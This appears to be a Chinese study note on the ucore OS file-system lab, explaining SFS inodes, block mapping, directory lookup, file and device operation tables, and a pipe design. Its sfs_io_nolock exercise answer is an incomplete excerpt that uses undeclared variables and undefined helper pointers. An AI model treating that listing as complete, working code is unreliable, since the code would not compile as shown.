<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* inode for sfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span>;</span>                     <span class="comment">/* on-disk inode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode number */</span></span><br><span class="line">    <span class="keyword">bool</span> dirty;                                     <span class="comment">/* true if inode modified */</span></span><br><span class="line">    <span class="keyword">int</span> reclaim_count;                              <span class="comment">/* kill inode if it hits zero */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;                                <span class="comment">/* semaphore for din */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_link;                        <span class="comment">/* entry for linked-list in sfs_fs */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;                         <span class="comment">/* entry for hash linked-list in sfs_fs */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>内存inode包含了SFS的硬盘inode信息，而且还增加了其他一些信息，这属于是便于进行是判断否改写、互斥操作、回收和快速地定位等作用。需要注意，一个内存inode是在打开一个文件后才创建的，如果关机则相关信息都会消失。而硬盘inode的内容是保存在硬盘中的，只是在进程需要时才被读入到内存中，用于访问文件或目录的具体内容数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* filesystem for sfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> <span class="title">super</span>;</span>                         <span class="comment">/* on-disk superblock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>                             <span class="comment">/* device mounted on */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bitmap</span> *<span class="title">freemap</span>;</span>                         <span class="comment">/* blocks in use are mared 0 */</span></span><br><span class="line">    <span class="keyword">bool</span> super_dirty;                               <span class="comment">/* true if super/freemap modified */</span></span><br><span class="line">    <span class="keyword">void</span> *sfs_buffer;                               <span class="comment">/* buffer for non-block aligned io */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> fs_sem;                             <span class="comment">/* semaphore for fs */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> io_sem;                             <span class="comment">/* semaphore for io */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex_sem;                          <span class="comment">/* semaphore for link/unlink and rename */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_list;                        <span class="comment">/* inode linked-list */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *hash_list;                        <span class="comment">/* inode hash linked-list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对inode操作的辅助函数如下：</p>
<p><code>sfs_bmap_load_nolock</code> 将 <code>sfs_inode</code> 的第 index 个索引指向的 block 的索引值取出存到相应的指针指向的单元(<code>ino_store</code>)，该函数只接受 <code>index &lt;= inode-&gt;blocks</code> 的参数。当<code>index == inode-&gt;blocks</code>时,为 inode 增长一个 block。并标记 inode 为 dirty,这样可保证sfs在inode不再使用时将数据写回磁盘。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_bmap_load_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">uint32_t</span> index, <span class="keyword">uint32_t</span> *ino_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> =</span> <span class="built_in">sin</span>-&gt;din;</span><br><span class="line">    assert(index &lt;= din-&gt;blocks);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    <span class="keyword">bool</span> create = (index == din-&gt;blocks);</span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_bmap_get_nolock(sfs, <span class="built_in">sin</span>, index, create, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(sfs_block_inuse(sfs, ino));</span><br><span class="line">    <span class="keyword">if</span> (create) &#123;</span><br><span class="line">        din-&gt;blocks ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ino_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *ino_store = ino;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_bmap_get_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">uint32_t</span> index, <span class="keyword">bool</span> create, <span class="keyword">uint32_t</span> *ino_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> =</span> <span class="built_in">sin</span>-&gt;din;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint32_t</span> ent, ino;</span><br><span class="line">	<span class="comment">// the index of disk block is in the first SFS_NDIRECT  direct blocks</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt; SFS_NDIRECT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ino = din-&gt;direct[index]) == <span class="number">0</span> &amp;&amp; create) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((ret = sfs_block_alloc(sfs, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">            din-&gt;direct[index] = ino;</span><br><span class="line">            <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// the index of disk block is in the indirect blocks.</span></span><br><span class="line">    index -= SFS_NDIRECT;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; SFS_BLK_NENTRY) &#123;</span><br><span class="line">        ent = din-&gt;indirect;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_get_sub_nolock(sfs, &amp;ent, index, create, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ent != din-&gt;indirect) &#123;</span><br><span class="line">            assert(din-&gt;indirect == <span class="number">0</span>);</span><br><span class="line">            din-&gt;indirect = ent;</span><br><span class="line">            <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		panic (<span class="string">&quot;sfs_bmap_get_nolock - index out of range&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">    assert(ino == <span class="number">0</span> || sfs_block_inuse(sfs, ino));</span><br><span class="line">    *ino_store = ino;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sfs_bmap_get_nolock</code> 根据sfs_inode 的第 index 找到对应的磁盘数据块号。数据块索引采取多级索引方式，前12个指针直接指向数据块，此后的指针为间接数据块索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define SFS_BLK_NENTRY                              (SFS_BLKSIZE &#x2F; sizeof(uint32_t))</span><br></pre></td></tr></table></figure>
<p><code>sfs_bmap_truncate_nolock</code>释放多级数据索引表的最后一个 entry ，是 <code>sfs_bmap_load_nolock</code> 中，index == inode-&gt;blocks 的逆操作。当一个文件或目录被删除时，sfs 会循环调用该函数直到 inode-&gt;blocks 减为 0，释放所有的数据页。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_bmap_truncate_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> =</span> <span class="built_in">sin</span>-&gt;din;</span><br><span class="line">    assert(din-&gt;blocks != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_bmap_free_nolock(sfs, <span class="built_in">sin</span>, din-&gt;blocks - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    din-&gt;blocks --;</span><br><span class="line">    <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sfs_dirent_read_nolock</code>:将目录的第 slot 个 entry 读取到指定的内存空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_dirent_read_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">int</span> slot, struct sfs_disk_entry *entry) &#123;</span><br><span class="line">    assert(<span class="built_in">sin</span>-&gt;din-&gt;type == SFS_TYPE_DIR &amp;&amp; (slot &gt;= <span class="number">0</span> &amp;&amp; slot &lt; <span class="built_in">sin</span>-&gt;din-&gt;blocks));</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">	<span class="comment">// according to the DIR&#x27;s inode and the slot of file entry, find the index of disk block which contains this file entry</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, slot, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(sfs_block_inuse(sfs, ino));</span><br><span class="line">	<span class="comment">// read the content of file entry in the disk block </span></span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_rbuf(sfs, entry, <span class="keyword">sizeof</span>(struct sfs_disk_entry), ino, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    entry-&gt;name[SFS_MAX_FNAME_LEN] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sfs_dirent_search_nolock</code>是常用的查找函数。在目录下根据name进行查找，并且返回相应的搜索结果（文件或文件夹）的 inode 的编号(在ucore中与磁盘块编号一致)，和相应的 entry 在该目录的 index 编号以及目录下的数据页是否有空闲的 entry。文件的数据页是连续的；而对于目录，数据页不是连续的，当某个 entry 删除的时候，SFS 通过设置 entry-&gt;ino 为0将该 entry 所在的 block 标记为 free，在需要添加新 entry 的时候，SFS 优先使用这些 free 的 entry，其次才会去在数据页尾追加新的 entry。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_dirent_search_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint32_t</span> *ino_store, <span class="keyword">int</span> *slot, <span class="keyword">int</span> *empty_slot) &#123;</span><br><span class="line">    assert(<span class="built_in">strlen</span>(name) &lt;= SFS_MAX_FNAME_LEN);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((entry = kmalloc(<span class="keyword">sizeof</span>(struct sfs_disk_entry))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_pvalue(x, v)            do &#123; <span class="meta-keyword">if</span> ((x) != NULL) &#123; *(x) = (v); &#125; &#125; while (0)</span></span><br><span class="line">    <span class="keyword">int</span> ret, i, nslots = <span class="built_in">sin</span>-&gt;din-&gt;blocks;</span><br><span class="line">    set_pvalue(empty_slot, nslots);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nslots; i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_dirent_read_nolock(sfs, <span class="built_in">sin</span>, i, entry)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;ino == <span class="number">0</span>) &#123;</span><br><span class="line">            set_pvalue(empty_slot, i);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, entry-&gt;name) == <span class="number">0</span>) &#123;</span><br><span class="line">            set_pvalue(slot, i);</span><br><span class="line">            set_pvalue(ino_store, entry-&gt;ino);</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> set_pvalue</span></span><br><span class="line">    ret = -E_NOENT;</span><br><span class="line">out:</span><br><span class="line">    kfree(entry);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_dirent_read_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">int</span> slot, struct sfs_disk_entry *entry) &#123;</span><br><span class="line">    assert(<span class="built_in">sin</span>-&gt;din-&gt;type == SFS_TYPE_DIR &amp;&amp; (slot &gt;= <span class="number">0</span> &amp;&amp; slot &lt; <span class="built_in">sin</span>-&gt;din-&gt;blocks));</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">	<span class="comment">// according to the DIR&#x27;s inode and the slot of file entry, find the index of disk block which contains this file entry</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, slot, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(sfs_block_inuse(sfs, ino));</span><br><span class="line">	<span class="comment">// read the content of file entry in the disk block </span></span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_rbuf(sfs, entry, <span class="keyword">sizeof</span>(struct sfs_disk_entry), ino, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    entry-&gt;name[SFS_MAX_FNAME_LEN] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">sfs_node_fileops</span> =</span> &#123;</span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = sfs_openfile,</span><br><span class="line">    .vop_close                      = sfs_close,</span><br><span class="line">    .vop_read                       = sfs_read,</span><br><span class="line">    .vop_write                      = sfs_write,</span><br><span class="line">    .vop_fstat                      = sfs_fstat,</span><br><span class="line">    .vop_fsync                      = sfs_fsync,</span><br><span class="line">    .vop_reclaim                    = sfs_reclaim,</span><br><span class="line">    .vop_gettype                    = sfs_gettype,</span><br><span class="line">    .vop_tryseek                    = sfs_tryseek,</span><br><span class="line">    .vop_truncate                   = sfs_truncfile,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sfs_openfile</code>、<code>sfs_close</code>、<code>sfs_read</code>和<code>sfs_write</code>分别对应用户进程发出的open、close、read、write操作。其中<code>sfs_openfile</code>直接返回；<code>sfs_close</code>需要把对文件的修改内容写回到硬盘上，这样确保硬盘上的文件内容数据是最新的；<code>sfs_read</code>和<code>sfs_write</code>函数都调用了一个函数<code>sfs_io</code>，并最终通过访问硬盘驱动来完成对文件内容数据的读写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iobuf</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *io_base;     <span class="comment">// the base addr of buffer (used for Rd/Wr)</span></span><br><span class="line">    <span class="keyword">off_t</span> io_offset;   <span class="comment">// current Rd/Wr position in buffer, will have been incremented by the amount transferred</span></span><br><span class="line">    <span class="keyword">size_t</span> io_len;     <span class="comment">// the length of buffer  (used for Rd/Wr)</span></span><br><span class="line">    <span class="keyword">size_t</span> io_resid;   <span class="comment">// current resident length need to Rd/Wr, will have been decremented by the amount transferred.</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">sfs_io(struct inode *node, struct iobuf *iob, <span class="keyword">bool</span> write) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> *<span class="title">sfs</span> =</span> fsop_info(vop_fs(node), sfs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> *<span class="title">sin</span> =</span> vop_info(node, sfs_inode);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    lock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> alen = iob-&gt;io_resid;</span><br><span class="line">        ret = sfs_io_nolock(sfs, <span class="built_in">sin</span>, iob-&gt;io_base, iob-&gt;io_offset, &amp;alen, write);</span><br><span class="line">        <span class="keyword">if</span> (alen != <span class="number">0</span>) &#123;</span><br><span class="line">            iobuf_skip(iob, alen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="目录操作函数"><a href="#目录操作函数" class="headerlink" title="目录操作函数"></a>目录操作函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">sfs_node_dirops</span> =</span> &#123;</span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = sfs_opendir,</span><br><span class="line">    .vop_close                      = sfs_close,</span><br><span class="line">    .vop_fstat                      = sfs_fstat,</span><br><span class="line">    .vop_fsync                      = sfs_fsync,</span><br><span class="line">    .vop_namefile                   = sfs_namefile,</span><br><span class="line">    .vop_getdirentry                = sfs_getdirentry,</span><br><span class="line">    .vop_reclaim                    = sfs_reclaim,</span><br><span class="line">    .vop_gettype                    = sfs_gettype,</span><br><span class="line">    .vop_lookup                     = sfs_lookup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于目录也是一种文件，所以<code>sfs_opendir</code>、<code>sys_close</code>对应用户进程发出的open、close函数。相对于<code>sfs_open</code>，<code>sfs_opendir</code>只是完成一些open函数传递的参数判断后返回。目录的close操作与文件的close操作完全一致。由于目录的内容数据与文件的内容数据不同，所以读出目录的内容数据的函数为<code>sfs_getdirentry</code>，其主要工作是获取目录下的文件<code>inode</code>信息。</p>
<blockquote>
<p>首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolock读文件中数据的实现代码。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_io_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">void</span> *buf, <span class="keyword">off_t</span> offset, <span class="keyword">size_t</span> *alenp, <span class="keyword">bool</span> write) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> size, alen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    <span class="keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE; <span class="comment">//读写开始的扇区号</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;<span class="comment">//扇区数目</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断第一块的情况，是否对齐 </span></span><br><span class="line">    <span class="keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//判断 endpos 和 offset 是否在同一块中</span></span><br><span class="line">        <span class="comment">//若在同一块，读取字节数为endpos - offset</span></span><br><span class="line">        <span class="comment">//若不为同一块 则读取字节数为SFS_BLKSIZE - blkoff</span></span><br><span class="line">        size = (nblks != <span class="number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//总的需要读取的字节数</span></span><br><span class="line">        alen += size;</span><br><span class="line">        <span class="keyword">if</span> (nblks == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        buf += size, blkno ++, nblks --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对中间扇区的处理，中间扇区必然是对齐的</span></span><br><span class="line">    size = SFS_BLKSIZE;</span><br><span class="line">    <span class="keyword">while</span> (nblks != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//此处和前后部分不一样，可直接对整个扇区进行操作</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += size, buf += size, blkno ++, nblks --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对最后一块对齐情况的处理</span></span><br><span class="line">    <span class="keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += size;</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    *alenp = alen;</span><br><span class="line">    <span class="keyword">if</span> (offset + alen &gt; <span class="built_in">sin</span>-&gt;din-&gt;size) &#123;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;din-&gt;size = offset + alen;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sfs_io_nolock</code>的代码，是给定一个文件的<code>inode</code>以及需要读写的偏移量和大小，转换成数据块级别的读写操作。主要调用的是两个函数：</p>
<p><code>sfs_io_nolock</code>实现的功能是根据给定的inode,文件偏移量，读写字节数从磁盘中以数据块为单位将数据从磁盘中加载到内存(buffer)中。调用的关键函数有：</p>
<ul>
<li><code>sfs_bmap_load_nolock</code> 将sfs_inode的第index个索引指向的block的索引值取出存到对应的指针单元，执行错误时返回值不为0。</li>
<li><code>sfs_buf_op</code>/<code>sfs_block_op</code>  传入参数为数据块对应的扇区编号，进行读写操作。</li>
</ul>
<p>数据块的读入和读出均以块为单位进行，所以需要对边界情况进行处理。此外，用户希望的读写字节数和实际读写成功的字节数不一致，所以在每次读写操作时均会修改字节数。</p>
<blockquote>
<p>实现“UNIX的PIPE机制”的概要设计方案</p>
</blockquote>
<p>管道本质上就是一个操作系统内核管理的环形缓冲区，所以需要一块内存作为缓冲区，然后需要记录环形缓冲区的头部和尾部。当一个进程尝试从空管道读取数据或者向满管道写入数据的时候，操作系统内核需要将进程阻塞，所以还需要一个读取等待队列和一个写入等待队列。 缓冲区大小通常设为一页的大小4KB。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct pipe &#123;</span><br><span class="line">    size_t head; &#x2F;&#x2F; 缓冲区头部</span><br><span class="line">    size_t tail; &#x2F;&#x2F; 缓冲区尾部</span><br><span class="line">    wait_queue_t read_queue; &#x2F;&#x2F; 管道读取等待队列</span><br><span class="line">    wait_queue_t write_queue; &#x2F;&#x2F; 管道写入等待队列</span><br><span class="line">    char* buffer; &#x2F;&#x2F; 环形缓冲区</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在inode中添加管道数据结构和对应的函数接口。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">dev_node_ops</span> =</span> &#123;</span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = dev_open,</span><br><span class="line">    .vop_close                      = dev_close,</span><br><span class="line">    .vop_read                       = dev_read,</span><br><span class="line">    .vop_write                      = dev_write,</span><br><span class="line">    .vop_fstat                      = dev_fstat,</span><br><span class="line">    .vop_ioctl                      = dev_ioctl,</span><br><span class="line">    .vop_gettype                    = dev_gettype,</span><br><span class="line">    .vop_tryseek                    = dev_tryseek,</span><br><span class="line">    .vop_lookup                     = dev_lookup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="设备层文件IO层"><a href="#设备层文件IO层" class="headerlink" title="设备层文件IO层"></a>设备层文件IO层</h1><p>为了统一访问设备，我们将设备同样视作文件，通过访问文件的接口来访问设备。ucore实现了stdin设备文件、stdout设备文件、disk0设备文件。stdin设备就是键盘，stdout设备就是CONSOLE（串口、并口和文本显示器），而disk0设备是承载SFS文件系统的磁盘设备。</p>
<h2 id="设备接口"><a href="#设备接口" class="headerlink" title="设备接口"></a>设备接口</h2><p><code>device</code>数据结构具体描述如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> d_blocks;</span><br><span class="line">    <span class="keyword">size_t</span> d_blocksize;</span><br><span class="line">    <span class="keyword">int</span> (*d_open)(struct device *dev, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*d_close)(struct device *dev);</span><br><span class="line">    <span class="keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="keyword">bool</span> write);</span><br><span class="line">    <span class="keyword">int</span> (*d_ioctl)(struct device *dev, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>device数据结构用于表示块设备(比如磁盘)、字符设备(比如键盘、串口)的表示，以及对设备的基本操作。</p>
<p>为了将设备链接在一起，ucore定义了一个双向设备链表，通过链表可以访问所有设备文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static list_entry_t vdev_list;     &#x2F;&#x2F; device info list in vfs layer</span><br></pre></td></tr></table></figure>
<p>接下来通过<code>vfs_dev_t</code>数据结构建立文件系统与表示一个设备文件的inode数据结构的关系。</p>
